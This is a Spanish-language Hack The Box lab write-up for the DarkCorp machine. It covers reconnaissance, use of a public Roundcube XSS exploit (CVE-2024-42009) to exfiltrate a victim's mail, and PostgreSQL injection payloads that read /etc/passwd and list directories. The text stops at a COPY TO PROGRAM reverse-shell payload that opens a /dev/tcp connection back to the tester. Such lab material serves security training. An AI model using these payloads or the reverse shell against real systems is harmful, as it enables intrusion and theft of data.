---
title: "HTB DarkCorp"
date: 2025-10-18 02:45:00 +0000
categories: [WriteUps, Hack The Box, Active Directory, Insane]
tags: [Roundcube, CVE-2024-42009, SQLi, PostgreSQL, pg_read_file, pg_ls_dir, PostgreSQLRevShell, GPGDecrypt, DiscoverHosts, FScan, PortForwarding, Ligolo-ng, AS-REPRoast, NTLMRelay, RelayAttacks, Ntlmrelayx, ADCS, ESC8, Krbrelayx, PetitPotam, S4U2Self, PassTheTicket, BloodHound, ACLs, winPEAS, SAMDump, DPAPI, PasswordSpraying, GenericWrite, UPNSpoofing, SSH_GSSAPI, SSHWithKerberos, linPEAS, SSSDcreds, pyGPOAbuse, NTDS, DCSync]
image: /assets/img/writeups/htb-darkcorp/DarkCorpLogo.png
---
`DarkCorp` es una máquina de HackTheBox que destaca por su complejidad técnica y escenario realista de infraestructura corporativa. El entorno consta de tres sistemas interconectados: un servidor Debian con servicios web y de correo, un equipo Windows unido a dominio y un controlador de dominio Active Directory.

La intrusión comienza identificando una vulnerabilidad de cross-site scripting (XSS) en la instancia de RoundCube que permite el robo de sesiones administrativas. Esto revela credenciales temporales y subdominios internos no documentados. El acceso al panel administrativo expone una inyección SQL en PostgreSQL que se aprovecha para lograr ejecución remota de comandos mediante funciones de base de datos.

La escalada de privilegios en el servidor Linux conduce al descubrimiento de respaldos cifrados con PGP que contienen hashes de cuentas de dominio. Tras su descifrado, se obtiene acceso inicial al entorno Active Directory. Estas credenciales permiten interactuar con un servicio de monitorización web en el servidor Windows que realiza verificaciones HTTP con autenticación NTLM.

Mediante técnicas de relay de autenticación NTLM y explotación de vulnerabilidades en el servicio de impresión, se consigue acceso privilegiado al servidor WEB-01. El análisis del sistema revela credenciales almacenadas en tareas programadas y el Gestor de Credenciales de Windows.

El descubrimiento de reutilización de contraseñas entre cuentas permite expandir el acceso dentro del dominio. Se identifican configuraciones de delegación constrained y se manipulan atributos de shadow credentials para obtener acceso administrativo adicional.

El acceso root al servidor Debian permite extraer credenciales cacheadas del servicio SSSD, facilitando el movimiento lateral al controlador de dominio. La modificación final de Group Policy Objects (GPO) establece control administrativo completo sobre toda la infraestructura del dominio.

La máquina demuestra técnicas avanzadas de post-explotación en entornos Active Directory incluyendo; Relay Attacks, ADCS, Credential Caching, Shadow Credentials y Group Policy exploitation.

- Tags: [#Roundcube](/tags/roundcube/) [#CVE-2024-42009](/tags/cve-2024-42009/) [#SQLi](/tags/sqli/) [#PostgreSQL](/tags/postgresql/) [#pg_read_file](/tags/pg-read-file/) [#pg_ls_dir](/tags/pg-ls-dir/) [#PostgreSQLRevShell](/tags/postgresqlrevshell/) [#GPGDecrypt](/tags/gpgdecrypt/) [#DiscoverHosts](/tags/discoverhosts/) [#FScan](/tags/fscan/) [#PortForwarding](/tags/portforwarding/) [#Ligolo-ng](/tags/ligolo-ng/) [#AS-REPRoast](/tags/as-reproast/) [#NTLMRelay](/tags/ntlmrelay/) [#RelayAttacks](/tags/relayattacks/) [#Ntlmrelayx](/tags/ntlmrelayx/) [#ADCS](/tags/adcs/) [#ESC8](/tags/esc8/) [#Krbrelayx](/tags/krbrelayx/) [#PetitPotam](/tags/petitpotam/) [#S4U2Self](/tags/s4u2self/) [#PassTheTicket](/tags/passtheticket/) [#BloodHound](/tags/bloodhound/) [#ACLs](/tags/acls/) [#winPEAS](/tags/winpeas/) [#SAMDump](/tags/samdump/) [#DPAPI](/tags/dpapi/) [#PasswordSpraying](/tags/passwordspraying/) [#GenericWrite](/tags/genericwrite/) [#UPNSpoofing](/tags/upnspoofing/) [SSH_GSSAPI](/tags/ssh-gssapi/) [#SSHWithKerberos](/tags/sshwithkerberos/) [#linPEAS](/tags/linpeas/) [#SSSDcreds](/tags/sssdcreds/) [#pyGPOAbuse](/tags/pygpoabuse/) [#NTDS](/tags/ntds/) [#DCSync](/tags/dcsync/)

---
## Reconnaissance

Para la fase de reconocimiento inicial de la máquina **`DarkCorp`** utilizamos nuestra herramienta personalizada [**iRecon**](https://github.com/Gzzcoo/iRecon). Esta herramienta automatiza un escaneo Nmap completo que incluye:

1. **Detección de puertos TCP abiertos** (`-p- --open`).
2. **Escaneo de versiones** (`-sV`).
3. **Ejecución de scripts NSE típicos** para enumeración adicional (`-sC`).
4. **Exportación del resultado** en XML y conversión a HTML para facilitar su lectura.

Para empezar, exportaremos en una variable de entorno llamada `IP` la dirección IP de la máquina objetivo, lanzaremos la herramienta de `iRecon` proporcionándole la variable de entorno.

**Resumen de Puertos Abiertos**

En la enumeración de puertos encontramos importantes como los siguientes:

<table><thead><tr><th>Puerto</th><th>Servicio</th><th data-hidden></th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td></td></tr><tr><td>80</td><td>HTTP</td><td></td></tr></tbody></table>

En un principio, la máquina `DarkCorp` es un **Windows Server**, probablemente un **Domain Controller**. Revisando los puertos abiertos que hemos logrado enumerar, comprobamos que solamente dispone del servicio `SSH` (Puerto 22) y una página web `HTTP` (Puerto 80).

Probablemente los puertos del **Domain Controller** sean internos, revisaremos a continuación que es lo que sucede.

```bash
❯ iRecon 10.10.11.54
```

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_1.png)

Revisando los **headers** y **body** de la página web, nos encontramos un dominio llamado `drip.htb`. Este nuevo dominio, lo añadiremos en nuestro archivo `/etc/hosts`.

```bash
❯ curl -i 10.10.11.54
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Wed, 16 Apr 2025 17:19:30 GMT
Content-Type: text/html
Content-Length: 64
Last-Modified: Wed, 01 Jan 2025 11:32:02 GMT
Connection: keep-alive
ETag: "677527b2-40"
Accept-Ranges: bytes

<meta http-equiv="refresh" content="0; url=http://drip.htb/" />

❯ echo '10.10.11.54 drip.htb' | sudo tee -a /etc/hosts
10.10.11.54 drip.htb
```

***
## Web Enumeration

A través de la herramienta `whatweb`, realizaremos una comprobación de las tecnologías que emplea la aplicación web. Hemos detectado que utiliza el servidor **Nginx** en su versión **1.22.1** y que además muestra “**Powered by Roundcube**”, lo cual podría indicar la existencia de un servidor de correo `Roundcube`. Investigaremos cada uno de estos puntos con más detalle más adelante.

```bash
❯ whatweb -a 3 http://drip.htb
http://drip.htb [302 Found] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], IP[10.10.11.54], RedirectLocation[index], Title[Redirecting...], nginx[1.22.1]
http://drip.htb/index [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@company.com,support@drip.htb], HTML5, HTTPServer[nginx/1.22.1], IP[10.10.11.54], PoweredBy[Roundcube], Script, Title[DripMail], nginx[1.22.1]
```

Realizaremos una enumeración de directorios y páginas web utilizando la herramienta `feroxbuster`, que efectúa el escaneo de forma recursiva. A partir de los resultados obtenidos, hemos identificado varios directorios y rutas que probaremos a continuación.

```bash
❯ feroxbuster -u http://drip.htb -t 200 -s 200
                                                                                                                                                                                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://drip.htb
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       19l       31w      446c http://drip.htb/static/assets/img/favicon/site.webmanifest
200      GET        1l       85w     5159c http://drip.htb/static/assets/vendor/notyf/notyf.min.css
200      GET       11l      128w    10176c http://drip.htb/static/assets/img/favicon/apple-touch-icon.png
200      GET        7l       71w     2977c http://drip.htb/static/assets/vendor/chartist-plugin-tooltips/dist/chartist-plugin-tooltip.min.js
200      GET       39l      482w     2337c http://drip.htb/static/assets/img/favicon/safari-pinned-tab.svg
200      GET      357l      839w    11740c http://drip.htb/static/assets/js/volt.js
200      GET       10l       46w     2882c http://drip.htb/static/assets/img/favicon/favicon-32x32.png
200      GET        1l      118w     6893c http://drip.htb/static/assets/vendor/onscreen/dist/on-screen.umd.min.js
200      GET        2l       92w     6563c http://drip.htb/static/assets/vendor/smooth-scroll/dist/smooth-scroll.polyfills.min.js
200      GET        4l       22w     1745c http://drip.htb/static/assets/img/favicon/favicon-16x16.png
200      GET        1l       92w     7646c http://drip.htb/static/assets/vendor/notyf/notyf.min.js
200      GET        1l      587w    26627c http://drip.htb/static/assets/vendor/nouislider/distribute/nouislider.min.js
200      GET        1l      522w    31587c http://drip.htb/static/assets/vendor/vanillajs-datepicker/dist/js/datepicker.min.js
200      GET        1l      336w    22690c http://drip.htb/static/assets/vendor/sweetalert2/dist/sweetalert2.min.css
200      GET      254l      521w    21305c http://drip.htb/static/assets/img/illustrations/404.svg
200      GET        6l      273w    18835c http://drip.htb/static/assets/vendor/@popperjs/core/dist/umd/popper.min.js
200      GET       10l     1081w    58750c http://drip.htb/static/assets/vendor/simplebar/dist/simplebar.min.js
200      GET        6l      754w    59470c http://drip.htb/static/assets/vendor/bootstrap/dist/js/bootstrap.min.js
200      GET        9l      560w    40312c http://drip.htb/static/assets/vendor/chartist/dist/chartist.min.js
200      GET        1l     1974w    20360c http://drip.htb/index
200      GET        2l     1105w    64289c http://drip.htb/static/assets/vendor/sweetalert2/dist/sweetalert2.all.min.js
200      GET     2332l     3032w    65073c http://drip.htb/static/assets/img/illustrations/signin.svg
200      GET        1l      237w     4362c http://drip.htb/register
```

Al acceder a [**http://drip.htb**](http://drip.htb), encontramos tres endpoints principales: **/index**, **/contact** y **/register**.

* En **/index** se muestra la página DripMail, que cuenta con un menú de cuatro secciones y un botón “Sign In”.
* En **/contact** (“Contact Us”) hay un formulario para enviar mensajes al equipo.
* En **/register**, al hacer clic en “Sign Up”, se nos ofrece la posibilidad de crear una cuenta en DripMail, que, como apuntamos antes, probablemente funcione sobre un servidor de correo `Roundcube`. Trataremos de registrarnos con un nuevo usuario.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_2.png)

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_3.png)

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_4.png)

Al registrar la cuenta de correo, aparece un mensaje confirmando que se ha creado correctamente y se nos ofrece un enlace de “**Sign In”**. Al situar el cursor sobre este botón, comprobamos que apunta al subdominio `mail.drip.htb`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_5.png)

Añadiremos este nuevo subdominio en nuestro archivo `/etc/hosts` el cual dispondrá de la siguiente configuración.

```bash
❯ cat /etc/hosts | grep drip
10.10.11.54 drip.htb mail.drip.htb
```

Al acceder a [**http://mail.drip.htb**](http://mail.drip.htb), comprobamos que aparece un panel de autenticación del servidor de correo Roundcube. Ingresaremos con nuestras credenciales del nuevo correo registrado en los pasos anteriores.

> **Roundcube** es un cliente de correo electrónico basado en web, también conocido como webmail, que permite acceder a cuentas de correo a través de un navegador web. Facilita la gestión del correo electrónico, agenda de contactos y calendario, sin necesidad de instalar software adicional.
{: .prompt-info }

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_6.png)

Al iniciar sesión en `RoundCube` con la cuenta creada, comprobamos que el acceso es exitoso y recibimos un mensaje de bienvenida de **DripMail**, en el que aparece la dirección de correo **support@drip.htb**.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_7.png)

***
### Finding a vulnerable version of Roundcube Mail?

Accedemos a la sección **About** del menú lateral izquierdo y confirmamos que se trata de `Roundcube Webmail` **versión 1.6.7**. Esta información es muy valiosa, ya que podría haber vulnerabilidades específicas asociadas a dicha versión.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_8.png)

Hemos realizado una búsqueda en Internet y hemos encontrado varios CVE asociados a esa versión de `Roundcube`. El siguiente paso consistirá en analizar cuál de ellos resulta más relevante, verificar su funcionamiento y, en caso afirmativo, proceder a su explotación.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_9.png)

Entre los CVE detectados para esta versión de `Roundcube Webmail`, el que más nos llama la atención es el `CVE-2024-42009`.

> CVE-2024-42009 es una vulnerabilidad de Cross-Site Scripting persistente en la función `message_body()` de `program/actions/mail/show.php` de Roundcube Webmail (versiones hasta la 1.5.7 y de la 1.6.0 a la 1.6.7). Un atacante puede incrustar código JavaScript malicioso en el cuerpo de un correo que, al ser abierto en modo HTML por un usuario autenticado, permite exfiltrar cookies de sesión, robar o enviar correos en nombre de la víctima y acceder a información sensible (contactos, historiales). La explotación solo requiere que la víctima visualice el mensaje malicioso. Un payload típico utiliza un `<img>` con atributo `onerror` para enviar las cookies a un servidor atacante. La vulnerabilidad se corrige actualizando Roundcube a la versión 1.6.8 o 1.5.8, o bien deshabilitando la vista HTML de los correos y reforzando la sanitización del contenido.
{: .prompt-danger }

[https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2024-42009](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2024-42009)

[https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/](https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/)

***
### Trying to create mail for root user where we get some extra information

Antes de continuar con la explotación del `CVE-2024-42009`, intentaremos registrarnos en [http://drip.htb/register](http://drip.htb/register) con el usuario `root` para comprobar si al acceder obtenemos información adicional.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_10.png)

Verificamos que se nos ha creado correctamente la cuenta con el usuario `root`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_11.png)

Volvemos a [http://mail.drip.htb](http://mail.drip.htb) e intentamos acceder con el usuario `root` que acabamos de crear.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_12.png)

Comprobamos que podemos acceder al buzón de `root@drip.htb`.

Tras unos minutos recibimos un correo adicional al de bienvenida, enviado también por `root@drip.htb`, que parece ser una notificación automática de las tareas cron de limpieza de correo electrónico.

En el cuerpo del mensaje aparecen dos rutas interesantes que revelan otros dos usuarios:

* **/var/mail/ebelford/dovecot**
* **/var/mail/support/dovecot**

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_13.png)

Al revisar los encabezados de un mensaje recibido en **Roundcube**, observamos la presencia de un nuevo dominio: `drip.darkcorp.htb`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_14.png)

Añadiremos esta nuevo dominio en nuestro archivo `/etc/hosts` en la entrada que ya disponíamos.

```bash
❯ cat /etc/hosts | grep drip
10.10.11.54 drip.htb mail.drip.htb drip.darkcorp.htb
```

Realizaremos una enumeración de directorios y páginas en el nuevo subdominio para comprobar si obtenemos más información. Entre los resultados, hemos detectado un directorio llamado **/dashboard/**, que a su vez contiene varias rutas internas.

```bash
❯ feroxbuster -u http://drip.darkcorp.htb -t 200
                                                                                                                                                                                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://drip.darkcorp.htb
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        5w       64c http://drip.darkcorp.htb/
301      GET        7l       11w      169c http://drip.darkcorp.htb/dashboard => http://drip.darkcorp.htb/dashboard/
301      GET        7l       11w      169c http://drip.darkcorp.htb/dashboard/media => http://drip.darkcorp.htb/dashboard/media/
301      GET        7l       11w      169c http://drip.darkcorp.htb/dashboard/apps => http://drip.darkcorp.htb/dashboard/apps/
301      GET        7l       11w      169c http://drip.darkcorp.htb/dashboard/apps/home => http://drip.darkcorp.htb/dashboard/apps/home/
301      GET        7l       11w      169c http://drip.darkcorp.htb/dashboard/apps/static => http://drip.darkcorp.htb/dashboard/apps/static/
301      GET        7l       11w      169c http://drip.darkcorp.htb/dashboard/apps/templates => http://drip.darkcorp.htb/dashboard/apps/templates/
```

Al ejecutar dirsearch contra [http://drip.darkcorp.htb/dashboard/](http://drip.darkcorp.htb/dashboard/) detectamos nuevos recursos, destacando el archivo `.env` junto con otros ficheros y directorios relevantes.

```bash
❯ dirsearch -u 'http://drip.darkcorp.htb/dashboard/' -t 100 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 11460

Output File: /home/gzzcoo/Desktop/HackTheBox/Labs/Windows/AD/DarkCorp/content/reports/http_drip.darkcorp.htb/_dashboard__25-04-16_19-55-41.txt

Target: http://drip.darkcorp.htb/

[19:55:41] Starting: dashboard/
[19:55:43] 200 -  796B  - /dashboard/.env
[19:55:53] 301 -  169B  - /dashboard/__pycache__  ->  http://drip.darkcorp.htb/dashboard/__pycache__/
[19:56:12] 301 -  169B  - /dashboard/apps  ->  http://drip.darkcorp.htb/dashboard/apps/
[19:56:54] 301 -  169B  - /dashboard/media  ->  http://drip.darkcorp.htb/dashboard/media/
[19:57:18] 200 -  330B  - /dashboard/requirements.txt

Task Completed
```

Realizamos un `curl` a [http://drip.darkcorp.htb/dashboard/.env](http://drip.darkcorp.htb/dashboard/.env) y confirmamos que podemos listar el archivo de entorno, donde se muestran las credenciales de **PostgreSQL**. Más adelante comprobaremos si estas credenciales nos permiten conectar con la base de datos que utiliza el servicio.

```bash
❯ curl -s 'http://drip.darkcorp.htb/dashboard/.env'
# True for development, False for production
DEBUG=False

# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development

# If not provided, a random one is generated 
# SECRET_KEY=<YOUR_SUPER_KEY_HERE>

# Used for CDN (in production)
# No Slash at the end
ASSETS_ROOT=/static/assets

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```

***

### Abusing the contact form to redirect mail sent to support@drip.htb to our mailbox to obtain more valuable information.

También analizamos el funcionamiento del formulario de contacto para comprobar si realmente está operativo. Rellenamos los campos requeridos, utilizando nuestro correo registrado previamente (`gzzcoo@drip.htb`). Al enviarlo, la aplicación muestra un mensaje indicando que el formulario fue enviado correctamente.

Sin embargo, no recibimos ningún correo de confirmación o respuesta en nuestra bandeja de entrada, lo cual podría indicar que el backend del formulario no está enviando los mensajes correctamente o que la funcionalidad no está completamente implementada.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_15.png)

Al interceptar la solicitud generada al enviar el formulario, observamos que se realiza mediante el método **POST**, enviando las variables `name`, `email` y `message`, correspondientes a los campos del formulario. Además, encontramos una variable adicional llamada `recipient`, cuyo valor por defecto es `support@drip.htb`.

Esto nos lleva a pensar que podríamos modificar dicha variable para probar si el sistema permite cambiar el destinatario del mensaje. Por ejemplo, podríamos reemplazar `support@drip.htb` por una dirección de nuestra elección (como `gzzcoo@drip.htb`) y verificar si el formulario está mal configurado y permite redirigir los correos a destinatarios arbitrarios.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_16.png)

Por lo tanto, modificaremos el valor del parámetro `recipient` para que apunte a nuestro correo electrónico. De este modo, podremos comprobar si, al enviar la solicitud por **POST**, una mala configuración hace que nos llegue el mensaje a nosotros mismos.

Al enviar la petición, observamos que se produce una redirección; la seguiremos activando la opción “**Follow redirection**”.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_17.png)

Al volver a entrar en nuestro buzón (el creado al principio) en [http://mail.drip.htb](http://mail.drip.htb), comprobamos que nos ha llegado el correo anterior que hemos modificado el valor de `recipient` para que apuntara a nuestro correo.

En el mensaje original enviado a `support@drip.htb` que nos hemos enviado a nosotros mismos, aparece esta indicación:

> Si crees que has recibido un correo de “phishing”, reenvía el mensaje completo a nuestro ingeniero de seguridad en `bcase@drip.htb`.
{: .prompt-info }

Hemos identificado al ingeniero de seguridad (`bcase@drip.htb`) como una nueva víctima potencial, a quien podríamos atacar usando la vulnerabilidad `CVE-2024-42009` para exfiltrar sus correos mediante XSS.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_18.png)

***
### Roundcube 1.6.7 Exploitation - Desanitization in Inline Email Rendering \[Mail Exfiltration] (CVE-2024-42009)

En este momento que redacto el WriteUp ya han salido diversos PoC sobre la vulnerabilidad de XSS Exfiltration de RoundCube. Para poder realizar la explotación de dicha vulnerabilidad podemos utilizar el siguiente repositorio: [CVE-2024-42009](https://github.com/Bhanunamikaze/CVE-2024-42009)

```bash
❯ git clone https://github.com/Bhanunamikaze/CVE-2024-42009; cd CVE-2024-42009
Cloning into 'CVE-2024-42009'...
remote: Enumerating objects: 16, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 16 (delta 5), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (16/16), 7.69 KiB | 1.54 MiB/s, done.
Resolving deltas: 100% (5/5), done.
```
La herramienta espera la dirección de correo electrónico que enviará el mail, el recipiente (la víctima) y el target URL y el listener (nosotros mismos) donde recibiremos los correos exfiltrados.
 
```bash
python3 exploit.py --help
usage: exploit.py [-h] -fu FROM_USER -tu TO_USER -u TARGET_URL -ip SERVER_IP -p SERVER_PORT

CVE-2024-42009 PoC: Email Capture Listener & XSS Exploit

options:
  -h, --help            show this help message and exit
  -fu FROM_USER, --from-user FROM_USER
                        Sender email address
  -tu TO_USER, --to-user TO_USER
                        Recipient email address
  -u TARGET_URL, --target-url TARGET_URL
                        Target URL
  -ip SERVER_IP, --server-ip SERVER_IP
                        Listener server IP address
  -p SERVER_PORT, --server-port SERVER_PORT
                        Listener server port
```

Al ejecutar el exploit, enviando el correo con el payload malicioso al correo `bcase@drip.htb`, verificamos que hemos logrado exfiltrar sus correos electrónicos mediante la **vulnerabilidad de XSS** de `RoundCube`. En el correo electrónico obtenido, localizamos un nuevo subdominio (`dev-a3f1-01.drip.htb`) el cual nos indican que debemos restablecer nuestra contraseña y iniciar sesión para acceder al dashboard de análisis.

```bash
❯ python exploit.py -fu 'gzzcoo@drip.htb' -tu 'bcase@drip.htb' -u http://drip.htb/contact -ip 10.10.16.9 -p 1337
[*] CVE-2024-42009 PoC: Listening on 10.10.16.9:1337...


[+] Captured Email Content:
Hi bcase,
Welcome to DripMail! We're excited to provide you with convenient email solutions! If you need help, please reach out to us at
support@drip.htb
.

[+] Captured Email Content:
Hey Bryce,
The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.
You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.
If you encounter any issues or have feedback, let me know so I can address them promptly.
Thanks
```

Añadiremos a nuestro archivo `/etc/hosts` la nueva entrada del subdominio localizado. Nuestro archivo debería verse de la siguiente manera.

```bash
❯ cat /etc/hosts | grep drip
10.10.11.54 drip.htb mail.drip.htb drip.darkcorp.htb dev-a3f1-01.drip.htb
```

Al acceder a [http://dev-a3f1-01.drip.htb](http://dev-a3f1-01.drip.htb) se nos indica un mensaje de `Acces denied` obligándonos a iniciar sesión en el portal.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_19.png)

Al darle a `LOGIN` en la pantalla anterior, podremos observar la siguiente interfaz en [http://dev-a3f1-01.drip.htb/login](http://dev-a3f1-01.drip.htb/login). Siguiendo las instrucciones que le indicaban a `bcase@drip.htb` de restablecer sus credenciales antes de acceder, le daremos a `Reset Password` para realizar el proceso. 

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_20.png)

A continuación, seremos redirigidos a [http://dev-a3f1-01.drip.htb/forgot](http://dev-a3f1-01.drip.htb/forgot) donde deberemos de indicar el correo de `bcase@drip.htb` para que le envíen las nuevas credenciales por correo de su usuario. Posteriormente mediante la vulnerabilidad de **XSS Exfiltration** podríamos tratar de leer ese nuevo correo electrónico y localizar la nueva contraseña o link de restablecimiento de password.

Verificaremos que al darle a la opción de `Recover Password`, se nos indica un mensaje de `Reset token sent successfully.`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_21.png)

Volveremos a realizar la explotación de la vulnerabilidad para exfiltrar el nuevo correo que le ha debido llegar a `bcase@drip.htb` del restablecimiento de la contraseña.

En el correo exfiltrado, verificamos que se nos proporciona un enlace para poder restablecer las credenciales de `bcase`.

```bash
❯ python exploit.py -fu 'gzzcoo@drip.htb' -tu 'bcase@drip.htb' -u http://drip.htb/contact -ip 10.10.16.9 -p 1337
[*] CVE-2024-42009 PoC: Listening on 10.10.16.9:1337...


[+] Captured Email Content:
Your reset token has generated. Please reset your password within the next 5 minutes.
You may reset your password here:
http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z__4TA.VXZDKZdrSdJX0SiJHR0eU9PfHK0
```

Al acceder al enlace proporcionado, se nos indica de ingresar las nuevas credenciales para restablecer la contraseña. Una vez asignada la nueva contraseña, le daremos a la opción de `Reset password`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_22.png)

Verificaremos que el cambio de contraseña se ha realizado correctamente y hemos sido redirigidos al apartado de `Login`. Ingresaremos las nuevas credenciales para tratar de acceder al dashboard.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_23.png)

---
## Shell as postgres on DRIP

### SQL Injection

Al acceder al dashboard, verificamos una interfaz donde nos muestran diversos usuarios con información sobre su `username`, `mail` y `IP address` en formato tabla.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_25.png)

Por otro lado, también comprobamos que dispone de un buscador, el cual podría ser vulnerable a **SQL Injection**. Al ingresar un `'` en el buscador, comprobamos que por detrás se realiza un `SELECT * FROM "USERS" WHERE "Users".username = bcase"` .

Con esto confirmamos que por detrás la información es mostrada a través de una consulta SQL y además es vulnerable a **SQLi**, ya que se rompe la consulta y no está correctamente sanitizada.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_26.png)

Interceptaremos la solicitud desde `BurpSuite` para tratar de obtener más información sobre la BBDD. En el primer caso, tratamos de obtener la información de SQL a través de la siguiente consulta.

La consulta realizada nos confirma que se trata de una base de datos **PostgreSQL**.

```sql
''; SELECT version();
```

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_27.png)

### Read File - PostgreSQL Injection (pg\_read\_file)

Ya que tenemos confirmado que se trata de un **PostgreSQL**, revisaremos la siguiente página de `PayloadsAllTheThings` donde nos muestran diferentes payloads a probar para poder explotar el SQLi en esta base de datos en concreto.

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/PostgreSQL Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

Mediante la siguiente inyección SQL, trataremos de leer el archivo `/etc/passwd` del equipo objetivo que anteriormente comprobamos que era un sistema operativo Linux.

En el resultado obtenido, verificamos que hemos logrado leer dicho archivo del sistema, con lo que tenemos una vía potencial de leer archivos del equipo.

```sql
''; SELECT pg_read_file('/etc/passwd',0,1000);
```

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_28.png)

### List Directory - PostgreSQL Injection (pg\_ls\_dir)

Por otro lado, **PostgreSQL** dispone de una función llamada `pg_ls_dir` para listar directorios y archivos del sistema. En el siguiente ejemplo, logramos listar el contenido de la ruta `/var/www/` del equipo `drip.darkcorp.htb`.

```sql
''; SELECT pg_ls_dir('/var/www/');
```

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_29.png)
### Reverse Shell with COPY and CHR Technique (WAF Bypass)

**PostgreSQL 9.3** y superior ofrece una funcionalidad que permite ejecutar comandos arbitrarios en el sistema y lograr obtener un **Remote Code Execution**. Ya comprobamos que la versión que dispone la página web es superior, así que probaremos de intentar realizarlo.

En `PayloadAllTheThings` se nos muestra el siguiente payload para poder realizar la ejecución remota: `COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.16.9/443 0>&1"'`

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_56.png)

> En nuestros primeros intentos no logramos explotar exitosamente la funcionalidad de **Command Execution en PostgreSQL**, posiblemente debido a la presencia de un `WAF (Web Application Firewall)` que bloqueaba nuestros payloads.
>
